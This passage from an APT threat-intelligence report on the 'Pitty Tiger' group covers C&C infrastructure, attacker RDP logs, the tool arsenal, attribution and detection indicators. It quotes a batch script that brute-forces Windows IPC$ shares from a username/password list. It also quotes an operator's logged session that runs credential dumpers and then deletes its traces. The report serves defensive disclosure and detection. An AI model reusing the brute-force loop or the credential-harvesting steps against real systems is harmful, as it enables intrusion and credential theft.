“ The Eye of the Tiger ”                                  Page : 33/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Skypetm.com.tw infrastructure : subdomains and malware linked to it
Hosting Company        Geolocalisation         IP Range             IP Address           C&C server                 Timeline
Take 2 Hosting Inc.    San Jose , USA           173.252.192.0 -      173.252.198.103      newb02.skypetm.com.tw      Actually in use
173.252.255.255
Hurricane Electric     Fremont USA             66.220.0.0 -         66.220.4.100         sophos.skypetm.com.tw      Actually in use
Inc.                                          66.220.31.255
Taiwan Academic        Taipei , Taiwan          210.60.0.0 -         210.60.141.45        botemail.skypetm.com.tw    2012 - 03 - 06
Network                                       210.60.255.255
Gorillaservers Inc.    Los Angeles , USA        198.100.96.0 -       198.100.121.15       sophos.skypetm.com.tw      ?
198.100.127.255
Gorillaservers Inc.    Los Angeles , USA        198.100.96.0 -       198.100.121.15       margo.skypetm.com.tw       2013 - 11 - 22
198.100.127.255
Webnx Inc.             Los Angeles , USA        216.18.192.0 -       216.18.208.4         botemail.skypetm.com.tw    2013 - 04 - 04/2013-
216.18.223.255                                                     12 - 16
Webnx Inc.             Los Angeles , USA        216.18.192.0 -       216.18.208.4         qinoo.skypetm.com.tw       ?
216.18.223.255
Data                   Taipei , Taiwan          59.112.0.0 -         59.120.84.230        botemail.skypetm.com.tw    2012 - 03 - 12/2012-
Communication                                 59.123.255.255                                                     04 - 28
Business Group
Data                   Taipei , Taiwan          211.75.128.0 -       211.75.195.1         super.skypetm.com.tw       2011 - 08 - 30/2013-
Communication                                 211.75.255.255                                                     12 - 16
Business Group
Public release
Threat Intelligence
“ The Eye of the Tiger ”                                      Page : 34/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Data               Taipei , Taiwan          61.220.0.0 -           61.220.44.244      aniu.skypetm.com.tw     2013 - 04 - 05/2013-
Communication                             61.227.255.255                                                  12 - 16
Business Group
Data               Taipei , Taiwan          61.220.0.0 -           61.220.44.244      zeng.skypetm.com.tw     ?
Communication                             61.227.255.255
Business Group
Data               Taipei , Taiwan          61.220.0.0 -           61.220.209.17      qinoo.skypetm.com.tw    ?
Communication                             61.227.255.255
Business Group
New World          Hong Kong City ,         113.10.169.0 -         113.10.169.162     margo.skypetm.com.tw    Actually in use
Telephone Ltd.     Hong Kong               113.10.169.255
New World          Hong Kong City ,         58.64.185.0 -          58.64.185.200      zeng.skypetm.com.tw     2013 - 12 - 16/2013-
Telephone Ltd.     Hong Kong               58.64.185.255                                                   12 - 16
New World          Hong Kong City ,         113.10.240.0 -         113.10.240.54      qinoo.skypetm.com.tw    ?
Telephone Ltd.     Hong Kong               113.10.240.255
New World          Hong Kong City ,         113.10.221.0 -         113.10.221.126     zeng.skypetm.com.tw     ?
Telephone Ltd.     Hong Kong               113.10.221.255
New World          Hong Kong City ,         113.10.240.0 -         113.10.240.50      link.skypetm.com.tw     2012 - 12 - 21/2013-
Telephone Ltd.     Hong Kong               113.10.240.255                                                  12 - 16
Asia Data ( hong    Hong Kong City ,         101.1.17.0 -           101.1.25.74        zeng.skypetm.com.tw     Actually in use
Kong ) Limited      Hong Kong               101.1.31.255
Isp Satellite      Hong Kong City ,         202.174.130.0 -        202.174.130.110    ms11.skypetm.com.tw     2011 - 02 - 27/2013-
Broadband          Hong Kong               202.174.130.255                                                 12 - 16
Provider
Jeongkyunghee      Anyang , South           221.144.0.0 -          221.150.164.114    link.skypetm.com.tw     2011 - 06 - 29/2012-
Korea                   221.168.255.255                                                 12 - 18
COMMON CHARACTERISTICS BETWEEN THE TWO DOMAINS
Malware families and samples
Avstore.com.tw and skypetm.com.tw have 4 malware families in common , communicating to
subdomains of both domains :
Public release
Threat Intelligence
“ The Eye of the Tiger ”                                Page : 35/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Links between malware samples , IP addresses and c&cs associated to avstore.com.tw and skypetm.com.tw
OTHER DOMAINS LINKED WITH THE PITTY TIGER GROUP
Domain                     Shares          with                              Comment
paccfic.com                Whois           acers.com.tw ,
information     foxcom.com.tw ,
dopodo.com.tw ,
stareastnet.com.tw
webconference.com.tw       Whois           techsun.com.tw
information
Public release
Threat Intelligence
“ The Eye of the Tiger ”                            Page : 36/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
IP Address      techsun.com.tw ,
trendmicro.org.tw
stareastnet.com.tw     Whois           acers.com.tw ,                      Two PittyTiger malware and a CT RAT have been
information     foxcom.com.tw ,                     pointing to several stareastnet.com.tw subdomains .
dopodo.com.tw ,
paccfic.com
IP Address      dopodo.com.tw ,
foxcom.com.tw ,
kimoo.com.tw ,
symantecs.com.tw
symantecs.com.tw       Whois           trendmicroup.com                   A pittytiger dropper , a Paladin malware and a CT RAT have been
information                                       pointing to several symantecs.com.tw subdomains .
IP Address      dopodo.com.tw ,
foxcom.com.tw ,
kimoo.com.tw ,
stareastnet.com.tw ,
wmdshr.com ,
trendmicro.org.tw
trendmicroup.com       Whois           symantecs.com.tw
information
trendmicro.org.tw      Whois           Skypetm.com.tw ,                    A paladin and a PittyTiger malware have been pointing to several
information     avstore.com.tw                     trendmicro.org.tw subdomains .
IP Address      webconference.com.tw ,
techsun.com.tw ,
skypetm.com.tw ,
kimoo.com.tw ,
symantecs.com.tw ,
hdskip.com
lightening.com.tw      Whois           helosaf.com.tw ,                    Paladin and PittyTiger samples has been pointing to several
information     seed01.com.tw                      lightening.org.tw subdomains .
IP Address      seed01.com.tw ,
techsun.com.tw         Whois           webconference.com.tw
information
IP Address      webconference.com.tw ,
trendmicro.org.tw
dopodo.com.tw          Whois           acers.com.tw ,
information     foxcom.com.tw ,
stareastnet.com.tw
IP Address      stareastnet.com.tw ,
symantecs.com.tw ,
kimoo.com.tw
foxcom.com.tw          Whois           acers.com.tw ,
information     dopodo.com.tw ,
stareastnet.com.tw
IP Address      stareastnet.com.tw ,
symantecs.com.tw ,
kimoo.com.tw
acers.com.tw           Whois           acers.com.tw ,
information     foxcom.com.tw ,
stareastnet.com.tw
IP Address      symantecs.com.tw ,
wmdshr.com ,
kimoo.com.tw
Links between domains used by Pitty Tiger
Public release
Threat Intelligence
“ The Eye of the Tiger ”                                      Page : 37/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Timeline of Pitty Tiger domains registration information , based on e - mail address
Some domains registered by the group are very old . There is an increase in the registrations from
2010 on . All the e - mail addresses used are connected to the Pitty Tiger group .
Public release
Threat Intelligence
“ The Eye of the Tiger ”                                   Page : 38/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
VICTIMS
Mapping the victims of such a targeted campaign is not an easy task .
We have found the Pitty Tiger group to be very active against one particular private company from
the defense industry and one academic network of a government , , yet we think it was done to be
used as a proxy for some of the group ’s operations .
We have also found some connections from other companies to the c&c servers , yet we did not find
evidence that they were real victims .
These alleged victims do work in different sectors and are located mostly in European countries .
    1 company from the defense industry ;
    1 company from the energy industry ;
    1 company from the telecommunications industry ;
    1 company specialized in web development .
It might be surprising to see a company specialized in web development here , yet it has built
websites for interesting potential targets . We suspect Pitty Tiger to use this compromise to spear
phish other companies which are in commercial relation with this web development company .
We have to mention that we only had access to three of the several attackers’ servers . Therefore ,
we suppose the Pitty Tiger group could have more targets than what we could confirm .
We also found a lot of vulnerability scanners launched by the attackers at different targets , yet there
was no sign of compromise .
During the course of our investigations , we discovered a RAR archive on the attacker ’s server
containing 5 Word documents and one small C source code . These documents belong to the
defense company which has been compromised . According to the name of the files and the general
feel of the archive , we do think it was extracted by the attackers to “ show ” someone what kind of
data they could get from the compromise of that particular target . The documents were still
exhibiting comments from various users , showing it was an ongoing work and not old documents .
Interestingly enough , we saw a part of these documents appear on Virus - Total , with an additional
“ gift ” from the attackers , a payload dropping a malware .
There are only two options we can think of here :
 Someone from the same company has been targeted with this document .
 Someone from another company has been targeted with this document . This other company
could be a partner or competitor .
Since we were unable to determine the intended use of this specific document , we can only suppose
that it could be used to provide commercial advantages to competitors of that company , or used by
a foreign state .
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 39/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
ATTACKERS
During our investigation , we found out interesting information about the Pitty Tiger group itself . After
analyzing the various collected elements , we have tried to draw a portrait of this particular threat .
ATTACKER ’S CONNECTIONS TO THE C&C
We have been able to get all the RDP connections logs to one c&c server :
COMPUTER NAME               OCCURENCES IP ADDRESSES COUNTRY
23.226.178.162              USA
27.155.90.80               China
27.155.110.81               China
27.156.49.223               China
58.64.177.60             Hong Kong
59.53.91.33                China
103.20.192.11             Hong Kong
50PZ80C-1DFDCB8                      65               110.90.60.250               China
110.90.61.69               China
110.90.62.185               China
120.32.113.97               China
120.32.114.209              China
121.204.33.130              China
121.204.33.153              China
183.91.52.230             Hong Kong
27.151.0.224               China
27.155.109.89               China
FLY - THINK                      11
121.204.88.120              China
120.32.114.139              China
TIEWEISHIPC                      2               27.16.139.143               China
CHMXY - PC                        1                 58.61.40.5                China
RDP connections from attackers machines to one particular c&c , from beginning of April 2014 to beginning of July 2014
These connections are either VPS or dynamic IP addresses , mostly from China .
A computer named CHMXY - PC connected to the c&c via RDP with IP address 58.61.40.5 . The IP is
in an ADSL dynamic pool in the Gangzhou area ( Guangdong province ) :
Public release
Threat Intelligence
“ The Eye of the Tiger ”                                   Page : 40/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
IP address used by CHMXY - PC
A few connections to the c&c were done by a computer named TIEWEISHIPC with IP address
27.16.139.143 . This IP address belongs to an ADSL dynamic pool in the Wuhan area ( Hubei ’s
provincial capital ) .
IP address used by TIEWEISHIPC computer
Some connections to the c&c originated from a computer named FLY - THINK with several IP
addresses , all located in Fuqing ( Fujian province ) . The IP addresses are in an ADSL dynamic pool :
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 41/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
IP addresses used by the FLY - THINK machine
Most of the connections to the c&c server were coming from a computer named 50PZ80C-
1DFDCB8 with several IP addresses . There are 11 IP addresses from Chinese dynamic ADSL
ranges : 9 from Fuqing ( Fujian province ) , one from Fuzhou ( Fujian ’s province capital ) and one from
Nanchang ( Jiangxi ’s province capital ) . The last one came from a VPS instance located in Los
Angeles ( California , USA ) but purchased by a China based VPS provider XeVPS which belong to
the AS38197 ( Sun Network Hong Kong Limited ) .
IP addresses used by the 50PZ80C-1DFDCB8 machine
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 42/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
The two computers FLY - THINK and 50PZ80C-1DFDCB8 have used distinct IP addresses to
connect to the c&c , yet some of these IP addresses come from the same IP range :
IP ranges overlapping between two machines used by the attackers
We mapped these RDP connections to have a graphical view :
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 43/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
RDP connections from the attackers to one c&c server
“ TOOT ”
We found that a member of this group of attackers used some tools on his own system , for testing
purposes . This information was still available when we got access to the c&c server .
He launched some tests with the CT RAT we exposed earlier :
User “ Toot ” logging on the CT RAT on machine “ toot-2a601225a8 ” , 2014/02/10
Public release
Threat Intelligence
“ The Eye of the Tiger ”                             Page : 44/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
User “ Toot ” logging on the CT RAT on machine “ toot-2a601225a8 ” , 2014/04/09
User “ Toot ” logging on the CT RAT on machine “ toot-2a601225a8 ” , 2014/04/09
Here we can see a user “ Toot ” from a machine named “ toot-2a601225a8 ” logging in the CT RAT
and executing some commands . The c&c IP address , 198.100.113.27 , can be seen there . Other log
files showed that “ Toot ” is using virtual machines for his tests .
We can also see the system : Microsoft Windows XP SP3 . The “ P ” field is the language ID .
Public release
Threat Intelligence
“ The Eye of the Tiger ”                             Page : 45/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
1028 means “ Chinese traditional ” . We have also seen tests run by “ toot ” with a language ID of 2052 ,
which is “ Chinese simplified ” .
The “ M ” field is probably used for versioning . It is a hardcoded string in the binary .
After these tests , we could see some real connections to a victim using this RAT . Here is a follow - up
of the commands launched by the bot controller , in a standard command - line shell :
Command                                        Effect
cd\temp                                        Folder change
Dir                                            Lists the content of the folder . The
attacker here is probably looking for his
tools and does not remember if they
are there or in system32 .
cd\windows\system32                            Folder change
dir tools *                                     Looking for tools.exe , a tool to fetch
different kind of credentials on the
system
tools                                          The attacker wants to see what the
options are for the tool .
tools –all                                     Tools.exe is launched .
At this point , the output shows the
attackers only gets successfully one
MSN credential in clear text , login and
password , and one Microsoft Outlook
credential .
type iecache.txt                               Shows the Internet Explorer cache to
the attacker . The output is huge .
dir cmd.exe                                    Looking for cmd.exe
del tools.exe                                  Remove the tools.exe after its use
dir tools.exe                                  Checks to see if it has been
successfully deleted
del iecache.txt                                Removes the IE cache log file .
regedit -e 1.reg                               Dumps the content of this key to a file
" HKEY_CURRENT_USER\Software\Microsoft\Windows named 1.reg
NT\CurrentVersion\Windows "
type 1.reg                                     Checks if dump has been successful .
del 1.reg                                      Deletes the dump
regedit -e v1.reg                              Do it again , we do not know why the
" HKEY_CURRENT_USER\Software\Microsoft\Windows attacker does this the output is the
NT\CurrentVersion\Windows "                     same as for previous regedit command
type v1.reg                                    Checks the dump again
dir * .reg                                      Looking for traces left in this folder
del v1.reg                                     Deletes the one * .reg file left .
del c:\windows\system32\mfqtirq.exe            Removes a binary used in the attack
del c:\windows\system32\crupalo.dll            Removes a binary used in the attack
dir c:\windows\system32\mfqtirq.exe            Checks       if    removal       has       been
successfull
dir c:\windows\system32\crupalo.dll            Checks       if    removal       has       been
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 46/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
successfull
tasklist                                                                Displays the list of applications and
services for all tasks running on the
computer
tasklist > 1.txt                                                         Stores the output of the previous
command in 1.txt
type 1.txt                                                              Checks the content
del 1.txt                                                               Removes the content
net start                                                               Lists all services running on the
machine
dir mailpv *                                                             Looks for “ MailPass View ” , a tool to
extract e - mail passwords from various
e - mail clients
mailpv /stext 1.txt                                                     Launches MailPass View and requests
the output to be generated as a text file
named 1.txt
type 1.txt                                                              Looks for the content :
 One MSN login / password
 One login / password for a POP3
e - mail account related to the
targeted entity
del mailpv.exe 1.txt                                                    Deletes both files
dir iepv *                                                               Looks for “ IE PassView ” tool , to extract
passwords from Internet Explorer .
Public domain .
iepv /stext 1.txt                                                       Launches the tool , output is a text file
named 1.txt
type 1.txt                                                              Looks for the output : none
del iepv.exe 1.txt                                                      Deletes both files
The attacker goes on like this , using his tools , and then ends the communication with this RAT on
that computer .
Please note that at this point , the attacker has at least the privileges of a local administrator , since
he is allowed to write content in the system32 folder of a Windows XP system . He could also gain
the credentials to a sensitive e - mail account .
In addition to all information already shown , we saw Toot connect to an account on a cloud service
named “ Baidu Drive ” . The e - mail address linked to this account is dyanmips@qq.com ( QQ - ID :
2589315828 ) . We could find traces of two other e - mail accounts associated to Toot ,
cisco_dyanmips@qq.com ( QQ ID : 204156335 ) and cisco_dynamips@qq.com ( QQ ID :
1878836793 ) .
We did not find more information about user “ Toot ” , yet we miss Chinese language capabilities .
Public release
Threat Intelligence
“ The Eye of the Tiger ”                              Page : 47/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
“ COLD & SNOW ”
The controller part of CT RAT / PittyTiger RAT revealed the following “ about ” information , once
translated from Chinese to English language :
CT console ( compatible pittytiger ) v1.3
2013.12 by Trees and snow
We believe this translation of the author ’s name might not be accurate due to the use of automated
translation tools . Moreover , we have strong suspicions that there is not a single individual
nicknamed “ Trees and snow ” but rather two programmers nicknamed “ Trees ” and “ Snow ” . “ Trees ”
could also be “ Cold ” . We noticed that the symbol for this word is translated differently according to
the context it is used in . Once again , we lack Chinese language skills .
We identify the two nicknames on the current campaign as Automn Snow ( 秋雪 ) and Cold Air Kiss (
风吻寒 ) .
While we are confident that these people are indeed the developers of both PittyTiger and CT RAT
malware , we are not sure they belong to the PittyTiger group . These developers might just have
been hired to develop these RATs . They might also just be selling it to the PittyTiger group . There is
no trace of usage from other attacking groups , we believe the PittyTiger RAT is exclusively used by
this group of attackers .
ROLES AND ORGANIZATION
According to indicators we gathered and threat activities profiling we have some hypothesis on the
way the group is conducting its operations .
We have strong evidence of a bot operator position . We identify one nickname for this position , the
user known as TooT. As we did not see other nickname , we think that TooT is one person and not a
group of persons .
We also identified a malware development position . We identified two nicknames for this position on
the current campaign , Automn Snow ( 秋雪 ) and Cold Air Kiss ( 风吻寒 ) . Yet we are unsure that they
belong to the group , they might just be a third party providing or selling their malware .
We have a strong suspicion of a coordinator position , which coordinates the bot operator , provides
him with some logistics support ( weaponized document , tools … ) and reviews the programmers
work . This position could imply a communication channel with another manager .
We named this position ‘ Chen’ , in relation with several references of this common Chinese name in
c&c WHOIS and other investigation materials .
We have some suspicion of a customer relationship manager position that may act as an interface
between a customer and Chen . We named this position ‘ Lilly’.
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 48/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Proposal for PittyTiger team structure
ATTACKERS ARSENAL
The c&c servers used by the attackers revealed a lot of interesting files stored in various folders :
Filename                     Description                                                    Public tool ?
32m.exe     /    3200.exe    / MM RAT                                                         No
ieupdate.exe / insert.exe /
khuvaxu.exe
32mm.exe / mm32.exe          CT RAT                                                         No
322.exe                      Chinese version of calc.exe , probably for                      Yes
testing purposes
client.exe                   File transfer tool , via pipes                                  No
CP.exe / CP_sep.exe            Microsoft Outlook dumper                                       No
CT.exe                       Controller for CT RAT ( 2013.10 )                                No
ct1.exe                      Controller for both CT RAT and PittyTiger RAT                  No
Diruse.exe                   Tool to display disk usage for a directory tree                Yes
GlobalWind.exe               Controller for Pitty Tiger                                     No
gsec1.exe                    GSecDump password dumper                                       Yes
http.exe/wsup.exe            Controller for MM RAT                                          No
Public release
Threat Intelligence
“ The Eye of the Tiger ”                           Page : 49/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
km.exe                               “ Toyi ” keylogger                                        No
logreader.exe                        Tool to decrypt the km.exe keylogger data               No
Mailpv.exe                           “ Mail PassView ” tool , to extract e - mail                 Yes
passwords from various e - mail clients .
Netpass.exe                          “ Network Password Recovery ” tool , to extract            Yes
network passwords .
iepv.exe /iepv - jiake.exe             “ IE PassView ” tool , to extract passwords from           Yes
Internet Explorer .
The file iepv-jiake.exe is the same , but crypted
using a tool named DarkCrypt ( DarkCrpt ) .
routerpass.exe                       “ Router PassView ” tool , to extract credentials          Yes
in some router backup files .
pstpass.exe                          “ PstPassword ” tool , to extract Outlook ’s PST            Yes
files passwords .
vncpass.exe                          “ VNCPassView ” tool , to extract passwords                Yes
stored by the VNC tool .
rdpv.exe                             “ Remote Desktop PassView ” tool , to extract              Yes
the passwords from .RDP files .
lookpass.exe                         Password revealer .                                      Yes
tools.exe , res.exe                   Multi              password               dumper :         No
RDP , VNC , IE , ProtectedStorage , MSN , Wireless ,
etc .
p2012.exe                            Controller for Paladin 2.1                              No
p.exe                                Controller for Paladin 2.2                              No
po.exe                               TCP Tunneling tool .                                     No
pp.exe                               Controller for Paladin 2.1                              No
pr.exe                               Dotpot port scanner .                                    Yes
rar.exe                              Rar archiving tool , command - line version .               Yes
sff.exe                              File - searching tool to hunt for doc , txt , mdb ,            No
sec , eml , vsd , ppt , pps , dbx ( SearchFile ) .
ssql.exe                             MySQL scanner .                                          No
w7ij32.exe                           Windows 7 DLL injector .                                 No
ToyI.dll                             Keylogger . Can be used with w7ij32.exe                  No
winspre.exe                          Troj / ReRol . A                                            No
dr.asp                               Front - end for Troj / ReRol . A.                             No
sk.exe                               Snake ’s SkServer .                                       Yes
Fluxay5Beta1                         Vulnerability scanner                                   Yes
feitafanghuoqiang                    Fortinet vulnerability scanner                          No
Hscan1.2                             Vulnerability scanner                                   Yes
mimi.exe , mimikaz64.exe              Mimikatz password dumper                                Yes
o2scan                               Vulnerability scanner                                   Yes
Openssl                              Heartbleed Exploit                                      Yes
X - Scan - v3.3                          X - Scan vulnerability scanner                            Yes
8uFTP                                FTP client                                              Yes
NcFTP                                FTP client                                              Yes
SEPM exploit                         Remote command execution exploit on                     Yes
Symantec Endpoint Protection Manager ( CVE-
2013 - 5014 , CVE 2013 - 5015 )
Public release
Threat Intelligence
“ The Eye of the Tiger ”                          Page : 50/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
s.exe                                    PHP Scanner                                                  No
Shanian Port Scanner                     Port scanner                                                 Yes
This is quite the usual arsenal for a group of APT attackers :
    Malware ( Troj / ReRol . A )
    Remote Administration Tools ( MM RAT , CT RAT , Pitty Tiger , Paladin )
    E - mail espionage tools ( cp.exe , mailpv.exe )
    Passwords dumpers ( gsecdump , NirSoft tools , Mimikatz etc . )
    Network scanners ( pr.exe )
    Network - oriented tools ( po.exe )
    Vulnerability scanners ( ssql.exe , Fluxay , etc . )
What is rare to find is the controller part of those tools . We have been lucky enough to get the
controller part of Pitty Tiger and CT RAT , and even to get a kind of hybrid controller made for CT
RAT but also supporting Pitty Tiger . We suppose that the CT RAT is the new evolution of Pitty Tiger
and that it will replace Pitty Tiger in the following months .
The presence of a Chinese version of “ calc.exe ” , the official calculator provided in Microsoft
Windows , is interesting . Not only is it one more indicator of a probable Chinese origin , but also an
indicator that this server was probably used as a test base , in addition to being operational and
controlling infected machines from different targets .
In addition to those tools , we found some interesting scripts . A script named ipc.bat uses a file
named user.txt to try to brute - force a shared folder access :
for /f " tokens=1,2 delims= " % % i in ( user.txt ) do ( net use \\<TARGETEDIP>\ipc$ " % % j " /u:%%i )
& & ( net use \\<TARGETEDIP > /del ) & & ( echo user:%%i pass:%%j>>succ.txt )
One script used to brute - force a network share inside a company ’s network
The user.txt file contains thousands of lines , each one being a couple of one particular username
and one password attempt :
administrator nameofonetargetedcompany
administrator ! Password
administrator azerty123
…
administrateurnameofonetargetedcompany
administrateur ! Password
administrateur azerty123
…
< username > nameofonetargetedcompany
< username > ! Password
< username > azerty123
…
< anotheruser > nameofonetargetedcompany
< anotheruser > ! Password
< anotheruser > azerty123
…
Anonymized dictionary file used for brute - forcing a network share
Public release
Threat Intelligence
“ The Eye of the Tiger ”                               Page : 51/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
This user.txt file has been anonymized , yet we wanted to give you the feel for it . This file is 67320
lines long , and uses 5610 different passwords for each of 12 users contained in this file . The user
names are clearly the result from a user enumeration and are dedicated to a particular French
victim .
The passwords listed in this file are either build from several campaigns or from the current
campaign . A lot of passwords are related to the targeted company and might be previous passwords
from users .
We have also discovered a pack of files which can be used to trigger an Internet Explorer
vulnerability ( CVE-2014 - 0322 ) . The date of these files , namely Tope.swf and index.html , was
2014/02/18 , a few days after the revelation of existing exploits in the wild used in APT attacks1 .
We do not know if the Pitty Tiger group used this exploit or not , but found no trace indicating they
did . A lot of different attackers seem to have used that vulnerability since .
1
http://www.symantec.com / connect / blogs / new - internet - explorer-10-zero - day - discovered - watering-
hole - attack
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 52/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
ATTRIBUTION
Determining who is exactly behind an APT campaign is difficult . We tried to extract different
technical indicators , together with contextual elements .
Information relating to the tools used by the attackers has been leveraged for attribution :
    Several Chinese vulnerability scanners have been launched against targets ;
    Several Chinese tools have been used and found on the c&c servers of the attackers :
8uFTP , a Chinese version of calc.exe , etc . ;
    Two of the used RATs have been developed by the same developers : CT RAT and
PittyTiger RAT . The controllers for these RATs show Chinese language ;
    Several binaries used by the attackers show either “ Chinese - China ” or “ Chinese - Taiwan ”
language ID in their resources ;
    A decoy Word document has been found , written in Chinese language ;
The IP addresses used for the hosting of the c&c domains are mainly located in Taipei ( Taïwan ) and
Hong Kong City ( Hong Kong Special Administrative Region , PRC ) :
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 53/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Hosting information links for the c&c servers used in this campaign
Most RDP connections to the c&c infrastructure come from Chinese IP ranges in Fuqing ( Fujian
province , PRC ) . Yet some IP addresses in the USA and in Hong Kong have also been found ;
Public release
Threat Intelligence
“ The Eye of the Tiger ”                            Page : 54/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
RDP connections from attackers to the c&c infrastructure
All the items listed in this chapter are strong indicators that the attackers might be Chinese .
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 55/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
CONCLUSION
Pitty Tiger is a group of attackers that have been active since at least 2011 .
Pitty Tiger is effective and mature in the use of targeted malware , the use of known exploits to infect
computers with their malware and the creation of an infrastructure to efficiently conduct APT attacks .
They are quite unprofessional in their way of using their infrastructure : they do launch vulnerability
scanners directly from a c&c server and also use their connection for personal activities
( downloading pornographic material for example , as we have seen a whole folder on a c&c server
full of xxx torrent links ) .
Pitty Tiger is probably not a state - sponsored group of attackers . The attackers lack the experience
and financial support that one would expect from state - sponsored attackers . We suppose this group
is opportunistic and sells its services to probable competitors of their targets in the private sector .
One governmental network has been targeted by the group , yet we do not have any evidence of the
purpose of this attack . We suppose this particular attack has been executed to provide a usable
bounce for the group .
The campaign we studied has been largely focused on one particular target . We suspect the Pitty
Tiger group to work according to an opportunistic business model : this group might offer its services
to third parties from the private sector .
This group seems to be very small compared to other APT groups . We have leveraged several
profiles and could identify some attackers to a certain extent . We believe this group might keep
working as it is now , with limited budgets , or grow to extend its attacking campaign capabilities .
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 56/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
INDICATORS
This list of indicators is provided in order to help people detect Pitty Tiger APT campaign .
DOMAINS
Domains used by the Pitty Tiger group : ( please note several subdomains are used , as seen in the
report )
acers.com.tw
kimoo.com.tw
paccfic.com
foxcom.com.tw
dopodo.com.tw
trendmicroup.com
lightening.com.tw
avstore.com.tw
helosaf.com.tw
trendmicro.org.tw
stareastnet.com.tw
symantecs.com.tw
seed01.com.tw
skypetm.com.tw
MALWARE HASHES
MD5 Hashes                                                        Malware Family
dc3d905ed90bbc148bccd34fe0c94d2d
dd87c68c1e71bb104a48a6be87a2349f
a494010a51705f7720d3cd378a31733a
be18418cafdb9f86303f7e419a389cc9
0750569cf1733d4fbb01169476387cc2
3282a5e77f24c645984ef152a2aea874                                                     PittyTiger RAT
8a54adb3976d1c03605656ca55be7400
666ae21ceaea9bb8017a967ea6128add
a1ea6dc12b983c7262fe76c1b3663b24
d5da60d678d5a55a847e1e6723c7a4d0
55e456339936a56c73a7883ea1ddb672
abb0abfab252e45bfb9106273df3c1c2
4ab74387f7a02c115deea2110f961fd3
b6380439ff9ed0c6d45759da0f3b05b8
bf95e89906b8a17fd611002660ffff32
ce15fa3338b7fe780e85c511d5e49a98                                                      Troj / ReRol . A
5e2360a8c4a0cce1ae22919d8bff49fd
12854bb8d1e6a590e1bd578267e4f8c9
5e2360a8c4a0cce1ae22919d8bff49fd
Public release
Threat Intelligence
“ The Eye of the Tiger ”                                   Page : 57/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
c0656b66b9f4180e59e1fd2f9f1a85f2
79e48961d1ee982a466d222671a42ccb
33714886dad497d6f0ecc255f0399004
3b498f19d467d2b8d4c778a92cacae9a
f71b374d341dc55b9b825531ba843f6d
8df89df484ca5c376b763479ea08d036                                                    Paladin RAT
0d3b3b422044759b4a08a7ad8afe55c7
789c23dfcd67a5543769a3f0261ea325
96a59b9813202734f59ae809105e73d1
26be2cbb00158dfab6c81976d93748e8
e7dc3bbe8b38b7ee0e797a0e27635cfa
4ce8593c9de2b27b5c389f651c81638b                                                         CT RAT
f65dc0b3eeb3c393e89ab49a3fac95a8
b0a4302789e9716705d30ad1f8775a84
81fa811f56247c236566d430ae4798eb                                         MM RAT ( aka Troj / Goldsun - B )
3654496539faedfe137a1f989359aef0                                                 Leo RAT
MALWARE STRINGS
Strings ( File / Network )                          Data type                          Malware Family
/FC001/GET                                     File string / Network string                   PittyTiger RAT
---PittyTiger                                             File string                         PittyTiger RAT
netsvcs_0x%d                                              File string                          Paladin RAT
\MSREVT.SRG                                               File string                          Paladin RAT
/httpdocs / mm/<bot_id>/ComMand.sec                       Network string                           MM RAT
/httpdocs / prx.sec                                       Network string                           MM RAT
CmdShell closed .                                          File string                            MM RAT
get file ok % u bytes                                      File string                             CT RAT
ok sleep % d minutes .                                      File string                             CT RAT
ca n't open mmfile                                         File string                          Troj / ReRol . A
